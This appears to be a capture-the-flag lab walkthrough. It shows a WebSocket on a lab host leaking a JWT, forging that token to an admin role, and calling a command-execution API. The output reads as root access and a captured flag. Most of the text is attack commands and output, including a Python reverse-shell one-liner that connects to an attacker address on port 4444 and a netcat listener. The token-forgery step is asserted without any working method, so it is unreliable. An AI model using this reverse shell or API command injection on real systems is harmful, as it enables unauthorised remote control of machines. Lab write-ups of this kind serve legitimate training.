WebSocket connection leaks session tokens.

### Initial Discovery
```
# Web app uses WebSockets
# Inspect network traffic in browser
# ws://10.10.10.110/ws

# Capture WebSocket messages
# Message contains: {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

#### Step 1: Intercept WebSocket
```
# Use wscat to connect
wscat -c ws://10.10.10.110/ws

# Send test message
> {"type":"ping"}
< {"type":"pong","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

# Token leaked in response!
```

#### Step 2: Use Stolen Token
```
# Decode JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0" | base64 -d
# {"user":"test","role":"user"}

# Modify to admin
# Use token with admin API
curl -H "Authorization: Bearer [MODIFIED_TOKEN]" http://10.10.10.110/api/admin
# {"users":["admin","root","backup"]}
```

#### Command Execution via API
```
# API endpoint for system commands
curl -H "Authorization: Bearer [ADMIN_TOKEN]" -X POST http://10.10.10.110/api/exec -d '{"cmd":"id"}'
# {"output":"uid=0(root) gid=0(root) groups=0(root)"}

# Get reverse shell
curl -H "Authorization: Bearer [ADMIN_TOKEN]" -X POST http://10.10.10.110/api/exec -d '{"cmd":"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.10.14.5\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\""}' 
```

#### Root Access
```
# Shell as root
nc -lvnp 4444
# root@target:~# whoami
# root

# Get flags
cat /root/root.txt
# 6f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c
```

